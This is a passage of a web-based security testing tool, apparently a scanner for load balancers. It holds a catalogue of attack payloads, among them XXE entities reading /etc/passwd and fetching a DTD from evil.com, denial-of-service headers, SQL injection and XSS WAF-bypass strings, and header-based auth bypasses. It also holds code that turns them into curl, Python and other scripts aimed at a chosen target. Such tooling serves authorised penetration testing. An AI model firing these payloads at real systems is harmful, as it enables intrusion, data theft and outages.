                severity: "high",
                path: "/",
                body: "data="
            },
            {
                name: "Large Header Attack",
                description: "Send oversized headers to exhaust resources",
                method: "GET",
                headers: {"X-Large-Header": "A".repeat(100) + "..."},
                severity: "medium",
                path: "/"
            },
            {
                name: "HTTP Pipeline Abuse",
                description: "Abuse HTTP pipelining for DoS",
                method: "GET",
                headers: {"Connection": "keep-alive"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Range Header DoS",
                description: "Use Range header for resource exhaustion",
                method: "GET",
                headers: {"Range": "bytes=0-1,2-3,4-5,6-7,8-9,10-11,12-13,14-15,16-17,18-19"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Accept-Encoding DoS",
                description: "Compression bomb via Accept-Encoding",
                method: "GET",
                headers: {"Accept-Encoding": "gzip,deflate,compress,br,*"},
                severity: "medium",
                path: "/"
            },
            {
                name: "Connection Exhaustion",
                description: "Exhaust connection pool",
                method: "GET",
                headers: {"Connection": "keep-alive", "Keep-Alive": "timeout=3600"},
                severity: "high",
                path: "/"
            },
            {
                name: "Memory Exhaustion Headers",
                description: "Exhaust memory with large headers",
                method: "GET",
                headers: {"X-Memory-Bomb": "X".repeat(1000)},
                severity: "medium",
                path: "/"
            },
            {
                name: "CPU Exhaustion Regex",
                description: "Cause CPU exhaustion with regex DoS",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/?search=" + "a".repeat(100) + "!"
            },
            {
                name: "SSL/TLS Handshake DoS",
                description: "Exhaust SSL handshake resources",
                method: "GET",
                headers: {"Connection": "close"},
                severity: "medium",
                path: "/"
            }
        ]
    },
    "HTTP/2 Protocol Attacks": {
        icon: "fa-code-branch",
        tests: [
            {
                name: "HTTP/2 SETTINGS Flood",
                description: "Flood with HTTP/2 SETTINGS frames",
                method: "GET",
                headers: {"HTTP2-Settings": "AAMAAABkAARAAAAAAAIAAAAA"},
                severity: "high",
                path: "/"
            },
            {
                name: "HTTP/2 CONTINUATION Flood",
                description: "Flood with CONTINUATION frames",
                method: "GET",
                headers: {"Connection": "Upgrade, HTTP2-Settings", "Upgrade": "h2c"},
                severity: "high",
                path: "/"
            },
            {
                name: "HTTP/2 PING Flood",
                description: "Flood with PING frames",
                method: "GET",
                headers: {"X-HTTP2-Ping": "flood"},
                severity: "medium",
                path: "/"
            },
            {
                name: "HTTP/2 Stream Manipulation",
                description: "Manipulate HTTP/2 stream priorities",
                method: "GET",
                headers: {"X-HTTP2-Stream-Priority": "256"},
                severity: "medium",
                path: "/"
            },
            {
                name: "HTTP/2 Frame Injection",
                description: "Inject malicious HTTP/2 frames",
                method: "GET",
                headers: {"X-HTTP2-Frame": "SETTINGS", "X-HTTP2-Payload": "malicious"},
                severity: "high",
                path: "/"
            },
            {
                name: "HTTP/2 HPACK Bomb",
                description: "HPACK compression bomb attack",
                method: "GET",
                headers: {"X-HTTP2-HPACK": "dynamic_table_size=0"},
                severity: "high",
                path: "/"
            },
            {
                name: "HTTP/2 Server Push Abuse",
                description: "Abuse HTTP/2 server push",
                method: "GET",
                headers: {"X-HTTP2-Push": "/admin/config"},
                severity: "medium",
                path: "/"
            },
            {
                name: "HTTP/2 Window Update DoS",
                description: "DoS via WINDOW_UPDATE frames",
                method: "GET",
                headers: {"X-HTTP2-Window": "0"},
                severity: "medium",
                path: "/"
            }
        ]
    },
    "XML & API Attacks": {
        icon: "fa-code",
        tests: [
            {
                name: "XXE External Entity",
                description: "XML External Entity injection",
                method: "POST",
                headers: {"Content-Type": "application/xml"},
                severity: "critical",
                path: "/api/xml",
                body: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"
            },
            {
                name: "XXE Parameter Entity",
                description: "XML Parameter Entity injection",
                method: "POST",
                headers: {"Content-Type": "application/xml"},
                severity: "critical",
                path: "/api/xml",
                body: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % test SYSTEM 'http://evil.com/evil.dtd'>%test;]><root></root>"
            },
            {
                name: "SOAP XXE Injection",
                description: "XXE injection in SOAP requests",
                method: "POST",
                headers: {"Content-Type": "text/xml", "SOAPAction": "test"},
                severity: "critical",
                path: "/soap",
                body: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body>&test;</soap:Body></soap:Envelope>"
            },
            {
                name: "GraphQL Introspection",
                description: "Enable GraphQL introspection",
                method: "POST",
                headers: {"Content-Type": "application/json"},
                severity: "medium",
                path: "/graphql",
                body: "{\"query\":\"query IntrospectionQuery { __schema { queryType { name } } }\"}"
            },
            {
                name: "GraphQL Depth Attack",
                description: "GraphQL query depth attack",
                method: "POST",
                headers: {"Content-Type": "application/json"},
                severity: "high",
                path: "/graphql",
                body: "{\"query\":\"query { user { posts { user { posts { user { posts { id } } } } } } }\"}"
            },
            {
                name: "REST API Version Bypass",
                description: "Bypass API versioning controls",
                method: "GET",
                headers: {"X-API-Version": "internal", "Accept": "application/vnd.api+json;version=beta"},
                severity: "high",
                path: "/api/v1/admin"
            },
            {
                name: "REST API Verb Tampering",
                description: "HTTP verb tampering on REST APIs",
                method: "GET",
                headers: {"X-HTTP-Method-Override": "DELETE", "X-Method-Override": "PATCH"},
                severity: "high",
                path: "/api/users/1"
            },
            {
                name: "API Rate Limit Bypass",
                description: "Bypass API-specific rate limits",
                method: "GET",
                headers: {"X-API-Key": "bypass", "X-RateLimit-Bypass": "internal"},
                severity: "high",
                path: "/api/sensitive"
            },
            {
                name: "API Endpoint Discovery",
                description: "Discover hidden API endpoints",
                method: "GET",
                headers: {"X-Debug-Mode": "true", "X-API-Debug": "endpoints"},
                severity: "medium",
                path: "/api"
            }
        ]
    },
    "gRPC & Protocol Attacks": {
        icon: "fa-sitemap",
        tests: [
            {
                name: "gRPC Metadata Injection",
                description: "Inject malicious gRPC metadata",
                method: "POST",
                headers: {"grpc-metadata-admin": "true", "grpc-metadata-bypass": "enabled", "Content-Type": "application/grpc"},
                severity: "high",
                path: "/grpc.service/Method"
            },
            {
                name: "gRPC Service Discovery",
                description: "Discover gRPC services",
                method: "POST",
                headers: {"grpc-metadata-reflection": "enabled", "Content-Type": "application/grpc"},
                severity: "medium",
                path: "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo"
            },
            {
                name: "gRPC Load Balancing",
                description: "Manipulate gRPC load balancing",
                method: "POST",
                headers: {"grpc-lb-policy": "round_robin", "grpc-backend-override": "admin-service", "Content-Type": "application/grpc"},
                severity: "medium",
                path: "/grpc.service/Method"
            },
            {
                name: "gRPC Auth Bypass",
                description: "Bypass gRPC authentication",
                method: "POST",
                headers: {"grpc-metadata-authorization": "bypass", "Content-Type": "application/grpc"},
                severity: "high",
                path: "/grpc.admin/AdminMethod"
            },
            {
                name: "Protocol Confusion HTTP/gRPC",
                description: "Confusion between HTTP and gRPC protocols",
                method: "GET",
                headers: {"Content-Type": "application/grpc"},
                severity: "medium",
                path: "/grpc.service/Method"
            },
            {
                name: "MQTT over HTTP",
                description: "MQTT protocol over HTTP transport",
                method: "POST",
                headers: {"Content-Type": "application/mqtt"},
                severity: "medium",
                path: "/mqtt"
            },
            {
                name: "WebRTC Signaling Injection",
                description: "Inject WebRTC signaling messages",
                method: "POST",
                headers: {"Content-Type": "application/sdp"},
                severity: "medium",
                path: "/webrtc/signaling"
            }
        ]
    },
    "Cloud & Container Attacks": {
        icon: "fa-cloud",
        tests: [
            {
                name: "Kubernetes Ingress Bypass",
                description: "Bypass Kubernetes ingress rules",
                method: "GET",
                headers: {"X-Forwarded-For": "127.0.0.1", "X-Kubernetes-Service": "admin"},
                severity: "high",
                path: "/"
            },
            {
                name: "Istio Service Mesh Bypass",
                description: "Bypass Istio service mesh policies",
                method: "GET",
                headers: {"X-Envoy-Original-Path": "/admin", "X-Istio-Attributes": "bypass"},
                severity: "high",
                path: "/"
            },
            {
                name: "Envoy Admin Interface",
                description: "Access Envoy proxy admin interface",
                method: "GET",
                headers: {"X-Envoy-Admin": "enabled", "X-Admin-Port": "9901"},
                severity: "critical",
                path: "/admin"
            },
            {
                name: "Consul Connect Bypass",
                description: "Bypass Consul Connect intentions",
                method: "GET",
                headers: {"X-Consul-Service": "admin", "X-Connect-Bypass": "true"},
                severity: "high",
                path: "/"
            },
            {
                name: "Docker API Access",
                description: "Access Docker daemon API",
                method: "GET",
                headers: {"X-Docker-API": "v1.40"},
                severity: "critical",
                path: "/v1.40/containers/json"
            },
            {
                name: "Container Escape Headers",
                description: "Headers for container escape attempts",
                method: "GET",
                headers: {"X-Container-Runtime": "docker", "X-Escape-Attempt": "true"},
                severity: "high",
                path: "/"
            },
            {
                name: "Service Mesh mTLS Bypass",
                description: "Bypass mutual TLS in service mesh",
                method: "GET",
                headers: {"X-mTLS-Bypass": "true", "X-Client-Cert-Bypass": "enabled"},
                severity: "high",
                path: "/"
            }
        ]
    },
    "Rate Limiting & WAF Bypass": {
        icon: "fa-tachometer-alt",
        tests: [
            {
                name: "Rate Limit Reset",
                description: "Reset rate limit counters",
                method: "GET",
                headers: {"X-Rate-Limit-Reset": "now"},
                severity: "high",
                path: "/"
            },
            {
                name: "Rate Limit Bypass Admin",
                description: "Bypass rate limiting with admin bypass",
                method: "GET",
                headers: {"X-Rate-Limit-Bypass": "admin"},
                severity: "critical",
                path: "/"
            },
            {
                name: "Burst Limit Override",
                description: "Override burst rate limits",
                method: "GET",
                headers: {"X-Burst-Limit": "unlimited"},
                severity: "high",
                path: "/"
            },
            {
                name: "IP Whitelist Bypass",
                description: "Bypass IP-based rate limiting",
                method: "GET",
                headers: {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"},
                severity: "high",
                path: "/"
            },
            {
                name: "User-Agent Rate Limit Bypass",
                description: "Bypass rate limiting via User-Agent rotation",
                method: "GET",
                headers: {"User-Agent": "GoogleBot/2.1"},
                severity: "medium",
                path: "/"
            },
            {
                name: "WAF Bypass SQL Injection",
                description: "Bypass WAF with SQL injection payload",
                method: "GET",
                headers: {},
                severity: "high",
                path: "/?id=1/**/UNION/**/SELECT/**/*/**/FROM/**/users"
            },
            {
                name: "WAF Bypass XSS",
                description: "Bypass WAF with XSS payload",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/?search=<svg/onload=alert(1)>"
            },
            {
                name: "WAF Bypass Case Variation",
                description: "Bypass WAF using case variation",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/?cmd=SeLeCt * FrOm UsErS"
            },
            {
                name: "WAF Bypass Encoding",
                description: "Bypass WAF using URL encoding",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/?payload=%3Cscript%3Ealert(1)%3C/script%3E"
            },
            {
                name: "WAF Bypass Comment Injection",
                description: "Bypass WAF using comment injection",
                method: "GET",
                headers: {},
                severity: "medium",
                path: "/?id=1/*comment*/UNION/*comment*/SELECT"
            }
        ]
    }
};

        // Initialize the interface
        function init() {
            populateFilters();
            renderTests();
            updateCounts();
            updateStats();
        }

        // Populate filter dropdowns
        function populateFilters() {
            const categoryFilter = document.getElementById('categoryFilter');
            Object.keys(testDatabase).forEach(category => {
                const option = document.createElement('option');
                option.value = category;
                option.textContent = category;
                categoryFilter.appendChild(option);
            });
        }

        // Render all tests with enhanced design
        function renderTests() {
            const container = document.getElementById('testContainer');
            container.innerHTML = '';
            
            Object.keys(testDatabase).forEach(categoryName => {
                const category = testDatabase[categoryName];
                const categoryDiv = document.createElement('div');
                categoryDiv.className = 'category-card fade-in';
                categoryDiv.dataset.category = categoryName;
                
                categoryDiv.innerHTML = `
                    <div class="category-header px-6 py-4">
                        <div class="flex items-center justify-between">
                            <h3 class="text-xl font-bold text-gray-800 flex items-center">
                                <div class="tech-gradient p-2 rounded-lg mr-3">
                                    <i class="fas ${category.icon} text-white text-lg"></i>
                                </div>
                                ${categoryName}
                            </h3>
                            <div class="flex items-center space-x-3">
                                <span class="test-counter">${category.tests.length} tests</span>
                                <button onclick="toggleCategory('${categoryName}')" class="text-gray-500 hover:text-gray-700">
                                    <i class="fas fa-chevron-down transition-transform duration-200" id="chevron-${categoryName}"></i>
                                </button>
                            </div>
                        </div>
                    </div>
                    <div class="p-6" id="content-${categoryName}">
                        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                            ${category.tests.map((test, index) => `
                                <div class="test-item card-hover rounded-xl p-4 cursor-pointer transition-all duration-300"
                                     data-category="${categoryName}"
                                     data-index="${index}"
                                     data-severity="${test.severity}"
                                     data-method="${test.method || 'GET'}"
                                     data-path="${test.path || '/'}"
                                     onclick="toggleTest(this)">
                                    <div class="flex items-start">
                                        <input type="checkbox" class="mt-1 mr-3 test-checkbox h-4 w-4 text-purple-600 rounded" 
                                               onclick="event.stopPropagation(); updateCounts();">
                                        <div class="flex-1">
                                            <h4 class="font-bold text-gray-900 mb-2">${test.name}</h4>
                                            <p class="text-sm text-gray-600 mb-3 leading-relaxed">${test.description}</p>
                                            <div class="flex items-center flex-wrap gap-2">
                                                <span class="text-xs px-3 py-1 rounded-full font-semibold severity-${test.severity}">
                                                    ${test.severity.toUpperCase()}
                                                </span>
                                                <span class="text-xs px-3 py-1 bg-blue-100 text-blue-700 rounded-full font-semibold">
                                                    ${test.method || 'GET'}
                                                </span>
                                                <span class="text-xs px-3 py-1 bg-gray-100 text-gray-700 rounded-full font-mono">
                                                    ${test.path || '/'}
                                                </span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            `).join('')}
                        </div>
                    </div>
                `;
                
                container.appendChild(categoryDiv);
            });
        }

        // Toggle category visibility
        function toggleCategory(categoryName) {
            const content = document.getElementById(`content-${categoryName}`);
            const chevron = document.getElementById(`chevron-${categoryName}`);
            
            if (content.style.display === 'none') {
                content.style.display = 'block';
                chevron.style.transform = 'rotate(0deg)';
            } else {
                content.style.display = 'none';
                chevron.style.transform = 'rotate(-90deg)';
            }
        }

        // Toggle test selection with enhanced feedback
        function toggleTest(element) {
            const checkbox = element.querySelector('.test-checkbox');
            checkbox.checked = !checkbox.checked;
            element.classList.toggle('test-selected', checkbox.checked);
            
            // Add visual feedback
            if (checkbox.checked) {
                element.style.transform = 'scale(1.02)';
                setTimeout(() => {
                    element.style.transform = '';
                }, 200);
            }
            
            updateCounts();
        }

        // Update selected counts with animation
        function updateCounts() {
            const total = document.querySelectorAll('.test-checkbox').length;
            const selected = document.querySelectorAll('.test-checkbox:checked').length;
            
            document.getElementById('totalCount').textContent = total;
            document.getElementById('selectedCount').textContent = selected;
            document.getElementById('selectedBadge').textContent = selected;
            
            // Animate the selected count
            const selectedElement = document.getElementById('selectedCount');
            selectedElement.style.transform = 'scale(1.2)';
            selectedElement.style.color = '#7c3aed';
            setTimeout(() => {
                selectedElement.style.transform = '';
                selectedElement.style.color = '';
            }, 300);
        }

        // Update statistics
        function updateStats() {
            const total = Object.values(testDatabase).reduce((sum, cat) => sum + cat.tests.length, 0);
            const critical = Object.values(testDatabase).reduce((sum, cat) => 
                sum + cat.tests.filter(t => t.severity === 'critical').length, 0);
            const high = Object.values(testDatabase).reduce((sum, cat) => 
                sum + cat.tests.filter(t => t.severity === 'high').length, 0);
            const categories = Object.keys(testDatabase).length;
            
            document.getElementById('totalTestsStat').textContent = total;
            document.getElementById('criticalTestsStat').textContent = critical;
            document.getElementById('highTestsStat').textContent = high;
            document.getElementById('categoriesStat').textContent = categories;
        }

        // Show statistics modal
        function showStats() {
            updateStats();
            document.getElementById('statsModal').classList.remove('hidden');
            
            // Create charts
            createSeverityChart();
            createCategoryChart();
        }

        // Close statistics modal
        function closeStats() {
            document.getElementById('statsModal').classList.add('hidden');
        }

        // Create severity distribution chart
        function createSeverityChart() {
            const ctx = document.getElementById('severityChart').getContext('2d');
            
            const severityData = {
                critical: 0,
                high: 0,
                medium: 0,
                low: 0
            };
            
            Object.values(testDatabase).forEach(cat => {
                cat.tests.forEach(test => {
                    severityData[test.severity]++;
                });
            });
            
            new Chart(ctx, {
                type: 'doughnut',
                data: {
                    labels: ['Critical', 'High', 'Medium', 'Low'],
                    datasets: [{
                        data: [severityData.critical, severityData.high, severityData.medium, severityData.low],
                        backgroundColor: ['#dc2626', '#ea580c', '#ca8a04', '#059669'],
                        borderWidth: 2,
                        borderColor: '#ffffff'
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        legend: {
                            position: 'bottom'
                        }
                    }
                }
            });
        }

        // Create category distribution chart
        function createCategoryChart() {
            const ctx = document.getElementById('categoryChart').getContext('2d');
            
            const categories = Object.keys(testDatabase);
            const counts = categories.map(cat => testDatabase[cat].tests.length);
            
            new Chart(ctx, {
                type: 'bar',
                data: {
                    labels: categories.map(cat => cat.substring(0, 15) + '...'),
                    datasets: [{
                        label: 'Tests',
                        data: counts,
                        backgroundColor: '#667eea',
                        borderColor: '#4c51bf',
                        borderWidth: 1
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                        legend: {
                            display: false
                        }
                    },
                    scales: {
                        y: {
                            beginAtZero: true
                        }
                    }
                }
            });
        }

        // Enhanced preset selection
        function selectPreset(preset) {
            clearAll();
            
            const presets = {
                fingerprint: () => document.querySelectorAll('[data-category="Load Balancer Fingerprinting"]'),
                vhost: () => document.querySelectorAll('[data-category="Virtual Host Discovery"]'),
                backend: () => document.querySelectorAll('[data-category="Backend Server Enumeration"]'),
                critical: () => document.querySelectorAll('[data-severity="critical"]'),
                smuggling: () => document.querySelectorAll('[data-category="Request Smuggling"]'),
                bypass: () => {
                    const categories = ['Authentication Bypass', 'Host Header Injection', 'Path Traversal & SSRF'];
                    return document.querySelectorAll(categories.map(c => `[data-category="${c}"]`).join(','));
                },
                comprehensive: () => document.querySelectorAll('.test-item')
            };
            
            const items = presets[preset]();
            let delay = 0;
            
            items.forEach(item => {
                setTimeout(() => {
                    const checkbox = item.querySelector('.test-checkbox');
                    if (checkbox) {
                        checkbox.checked = true;
                        item.classList.add('test-selected');
                        item.style.transform = 'scale(1.05)';
                        setTimeout(() => {
                            item.style.transform = '';
                        }, 150);
                    }
                }, delay);
                delay += 50;
            });
            
            setTimeout(updateCounts, delay + 100);
        }

        // Select all tests with animation
        function selectAll() {
            const items = document.querySelectorAll('.test-item');
            let delay = 0;
            
            items.forEach(item => {
                setTimeout(() => {
                    const checkbox = item.querySelector('.test-checkbox');
                    checkbox.checked = true;
                    item.classList.add('test-selected');
                }, delay);
                delay += 20;
            });
            
            setTimeout(updateCounts, delay + 100);
        }

        // Clear all selections with animation
        function clearAll() {
            const items = document.querySelectorAll('.test-item');
            items.forEach(item => {
                const checkbox = item.querySelector('.test-checkbox');
                checkbox.checked = false;
                item.classList.remove('test-selected');
            });
            updateCounts();
        }

        // Enhanced filtering with search highlighting
        function filterTests() {
            const search = document.getElementById('searchBox').value.toLowerCase();
            const categoryFilter = document.getElementById('categoryFilter').value;
            const severityFilter = document.getElementById('severityFilter').value;
            
            let visibleCount = 0;
            
            document.querySelectorAll('.test-item').forEach(item => {
                const category = item.dataset.category;
                const severity = item.dataset.severity;
                const text = item.textContent.toLowerCase();
                
                let show = true;
                
                if (search && !text.includes(search)) show = false;
                if (categoryFilter && category !== categoryFilter) show = false;
                if (severityFilter && severity !== severityFilter) show = false;
                
                item.style.display = show ? 'block' : 'none';
                
                if (show) {
                    visibleCount++;
                    // Highlight search terms
                    if (search) {
                        highlightSearchTerms(item, search);
                    } else {
                        removeHighlights(item);
                    }
                }
            });
            
            // Hide empty categories
            document.querySelectorAll('[data-category]').forEach(cat => {
                const hasVisible = cat.querySelector('.test-item[style*="block"], .test-item:not([style*="none"])');
                cat.style.display = hasVisible ? 'block' : 'none';
            });
            
            // Update active filters display
            updateActiveFilters(search, categoryFilter, severityFilter, visibleCount);
        }

        // Highlight search terms
        function highlightSearchTerms(element, searchTerm) {
            const walker = document.createTreeWalker(
                element,
                NodeFilter.SHOW_TEXT,
                null,
                false
            );
            
            const textNodes = [];
            let node;
            
            while (node = walker.nextNode()) {
                textNodes.push(node);
            }
            
            textNodes.forEach(textNode => {
                const text = textNode.textContent;
                const regex = new RegExp(`(${searchTerm})`, 'gi');
                if (regex.test(text)) {
                    const highlightedText = text.replace(regex, '<span class="search-highlight">$1</span>');
                    const wrapper = document.createElement('span');
                    wrapper.innerHTML = highlightedText;
                    textNode.parentNode.replaceChild(wrapper, textNode);
                }
            });
        }

        // Remove search highlights
        function removeHighlights(element) {
            const highlights = element.querySelectorAll('.search-highlight');
            highlights.forEach(highlight => {
                highlight.outerHTML = highlight.innerHTML;
            });
        }

        // Update active filters display
        function updateActiveFilters(search, category, severity, count) {
            const activeFilters = document.getElementById('activeFilters');
            activeFilters.innerHTML = '';
            
            if (search || category || severity) {
                const filterContainer = document.createElement('div');
                filterContainer.className = 'flex flex-wrap gap-2 items-center';
                
                if (search) {
                    filterContainer.appendChild(createFilterTag('Search', search, () => {
                        document.getElementById('searchBox').value = '';
                        filterTests();
                    }));
                }
                
                if (category) {
                    filterContainer.appendChild(createFilterTag('Category', category, () => {
                        document.getElementById('categoryFilter').value = '';
                        filterTests();
                    }));
                }
                
                if (severity) {
                    filterContainer.appendChild(createFilterTag('Severity', severity, () => {
                        document.getElementById('severityFilter').value = '';
                        filterTests();
                    }));
                }
                
                const resultText = document.createElement('span');
                resultText.className = 'text-sm text-gray-600 font-semibold';
                resultText.textContent = `${count} tests found`;
                filterContainer.appendChild(resultText);
                
                activeFilters.appendChild(filterContainer);
            }
        }

        // Create filter tag
        function createFilterTag(label, value, onRemove) {
            const tag = document.createElement('span');
            tag.className = 'inline-flex items-center px-3 py-1 rounded-full text-xs font-medium bg-purple-100 text-purple-800';
            tag.innerHTML = `
                ${label}: ${value}
                <button onclick="event.preventDefault(); this.parentElement.remove();" class="ml-2 text-purple-600 hover:text-purple-800">
                    <i class="fas fa-times"></i>
                </button>
            `;
            
            tag.querySelector('button').addEventListener('click', onRemove);
            return tag;
        }

        // Generate commands with enhanced options
        function generateCommands() {
            const selected = getSelectedTests();
            if (selected.length === 0) {
                alert('Please select at least one test to generate commands.');
                return;
            }
            
            const targetUrl = document.getElementById('targetUrl').value;
            const proxyUrl = document.getElementById('proxyUrl').value;
            const format = document.getElementById('outputFormat').value;
            
            let output = '';
            
            switch (format) {
                case 'curl-pure':
                    output = generatePureCurl(selected, targetUrl, proxyUrl);
                    break;
                case 'python':
                    output = generatePythonScript(selected, targetUrl);
                    break;
                case 'python-async':
                    output = generatePythonAsyncScript(selected, targetUrl);
                    break;
                case 'burp':
                    output = generateBurpRequests(selected, targetUrl);
                    break;
                case 'bash':
                    output = generateBashScript(selected, targetUrl, proxyUrl);
                    break;
                case 'powershell':
                    output = generatePowerShellScript(selected, targetUrl, proxyUrl);
                    break;
                case 'nuclei':
                    output = generateNucleiTemplates(selected, targetUrl);
                    break;
                case 'raw':
                    output = generateRawHttp(selected, targetUrl);
                    break;
            }
            
            document.getElementById('outputContent').textContent = output;
            document.getElementById('outputModal').classList.remove('hidden');
        }

        // Get selected tests
        function getSelectedTests() {
            const selected = [];
            document.querySelectorAll('.test-checkbox:checked').forEach(checkbox => {
                const item = checkbox.closest('.test-item');
                const category = item.dataset.category;
                const index = parseInt(item.dataset.index);
                const test = testDatabase[category].tests[index];
                selected.push({ category, test });
            });
            return selected;
        }

        // Generate pure cURL commands (no shell scripting)
        function generatePureCurl(tests, targetUrl, proxyUrl) {
            const url = new URL(targetUrl);
            const baseUrl = url.origin;
            const targetHost = url.hostname;
            
            const commands = tests.map(({ category, test }, index) => {
                let cmd = `curl -s -k -w "Status: %{http_code} | Time: %{time_total}s | Size: %{size_download}"`;
                
                // Add proxy if specified
                if (proxyUrl) {
                    cmd += ` --proxy ${proxyUrl}`;
                }
                
                // Add method
                if (test.method && test.method !== 'GET') {
                    cmd += ` -X ${test.method}`;
                }
                
                // Add headers
                if (test.headers) {
                    Object.entries(test.headers).forEach(([key, value]) => {
                        // Replace TARGET placeholder with actual hostname
                        const headerValue = value.replace(/TARGET/g, targetHost);
                        cmd += ` -H "${key}: ${headerValue}"`;
                    });
                }
                
                // Add body if present
                if (test.body) {
                    cmd += ` --data-raw "${test.body.replace(/"/g, '\\"')}"`;
                }
                
                // Build URL with path
                const fullUrl = baseUrl + (test.path || '/');
                cmd += ` "${fullUrl}"`;
                
                return cmd;
            });
            
            return commands.join(' && echo "---" && ');
        }

        // Generate enhanced Python script (no arguments)
        function generatePythonScript(tests, targetUrl) {
            const url = new URL(targetUrl);
            const targetHost = url.hostname;
            
            return `#!/usr/bin/env python3
"""
üõ°Ô∏è Advanced Load Balancer Security Scanner
üéØ Target: ${targetUrl}
üß™ Tests: ${tests.length}
üìÖ Generated: ${new Date().toISOString()}

This script performs comprehensive security testing against load balancers
including fingerprinting, vulnerability detection, and configuration analysis.
"""

import requests
import urllib3
import json
import time
import sys
import re
import hashlib
from urllib.parse import urlparse, urljoin
from datetime import datetime
from collections import defaultdict

# Disable SSL warnings
urllib3.disable_warnings()

# Configuration
TARGET_URL = "${targetUrl}"
TARGET_HOST = "${targetHost}"
TIMEOUT = 30
MAX_RETRIES = 3

class Colors:
    RED = '\\033[91m'
    GREEN = '\\033[92m'
    YELLOW = '\\033[93m'
    BLUE = '\\033[94m'
    PURPLE = '\\033[95m'
    CYAN = '\\033[96m'
    WHITE = '\\033[97m'
    BOLD = '\\033[1m'
    END = '\\033[0m'

class LoadBalancerSecurityScanner:
    def __init__(self):
        self.target = TARGET_URL
        self.host = TARGET_HOST
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = TIMEOUT
        self.session.headers.update({
            'User-Agent': 'LoadBalancer-SecurityScanner/3.0'
        })
        self.results = []
        self.fingerprints = set()
        self.backends = set()
        self.vulnerabilities = []

    def print_banner(self):
        banner = f"""
{Colors.PURPLE}‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                                                               ‚ïë
‚ïë     üõ°Ô∏è  Advanced Load Balancer Security Scanner 3.0          ‚ïë
‚ïë                                                               ‚ïë
‚ïë     üéØ Target: {self.target:<42} ‚ïë
‚ïë     üß™ Tests:  {len([t for _, t in tests]):<42} ‚ïë
‚ïë     üìÖ Date:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<42} ‚ïë
‚ïë                                                               ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù{Colors.END}
"""
        print(banner)

    def execute_test(self, category, test_name, description, method, headers, path, body=None, severity="medium"):
        """Execute a single security test with comprehensive analysis"""
        
        # Replace TARGET placeholder in headers
        processed_headers = {}
        if headers:
            for key, value in headers.items():
                processed_headers[key] = value.replace('TARGET', self.host)
        
        # Build full URL
        url = urljoin(self.target, path or '/')
        
        start_time = time.time()
        result = {
            'category': category,
            'name': test_name,
            'description': description,
            'method': method,
            'path': path,
            'severity': severity,
            'timestamp': datetime.now().isoformat(),
            'url': url,
            'headers_sent': processed_headers
        }
        
        severity_colors = {
            'critical': Colors.RED,
            'high': Colors.YELLOW,
            'medium': Colors.BLUE,
            'low': Colors.GREEN
        }
        
        severity_color = severity_colors.get(severity, Colors.WHITE)
        print(f"{Colors.CYAN}[*]{Colors.END} {severity_color}[{severity.upper()}]{Colors.END} {test_name}")
        
        try:
            response = self.session.request(
                method=method,
                url=url,
                headers=processed_headers,
                data=body,
                allow_redirects=False
            )
            
            result.update({
                'status_code': response.status_code,
                'response_time': round(time.time() - start_time, 3),
                'response_size': len(response.content),
                'response_headers': dict(response.headers),
                'success': True
            })
            
            # Comprehensive response analysis
            indicators = self._analyze_response(response, severity, test_name)
            result['indicators'] = indicators
            
            # Extract findings
            self._extract_findings(response, test_name, severity)
            
            status_emoji = self._get_status_emoji(response.status_code)
            print(f"    {status_emoji} Status: {response.status_code} | Time: {result['response_time']}s | Size: {result['response_size']} bytes")
            
            if indicators:
                for indicator in indicators[:3]:  # Show first 3 indicators
                    print(f"      {Colors.GREEN}‚Ä¢{Colors.END} {indicator}")
            
        except requests.exceptions.Timeout:
            result.update({
                'error': 'Request timeout',
                'response_time': TIMEOUT,
                'success': False
            })
            print(f"    {Colors.YELLOW}‚è±Ô∏è{Colors.END}  Timeout after {TIMEOUT}s")
            
        except requests.exceptions.RequestException as e:
            result.update({
                'error': str(e),
                'response_time': round(time.time() - start_time, 3),
                'success': False
            })
            print(f"    {Colors.RED}‚ùå{Colors.END} Error: {str(e)[:60]}...")
            
        except Exception as e:
            result.update({
                'error': f"Unexpected error: {str(e)}",
